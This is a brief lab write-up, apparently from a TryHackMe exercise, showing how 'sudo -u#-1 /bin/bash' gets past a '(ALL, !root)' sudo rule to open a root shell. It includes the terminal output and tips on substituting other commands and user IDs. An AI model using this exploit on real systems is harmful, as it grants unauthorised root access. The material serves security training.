This is incredibly easy.

If you run `sudo -l` and you get a response like this...

```
tryhackme@sudo-privesc:~$ sudo -l
Matching Defaults entries for tryhackme on sudo-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tryhackme may run the following commands on sudo-privesc:
    (ALL, !root) NOPASSWD: /bin/bash
tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash
root@sudo-privesc:~# whoami
root
```

You're looking for the `(ALL, !root) NOPASSWD: /bin/bash` and you can run that command as root with the following.

`sudo -u#-1 /bin/bash`

You can sub out the command (the `/bin/bash`) part with whatever command you are listed as !root for.

Interestingly enough, the `-1` part of the cmd line can be changed to whatever uid in order to take over whatever account you want.  Note that is the number 1 and not a lowercase l.
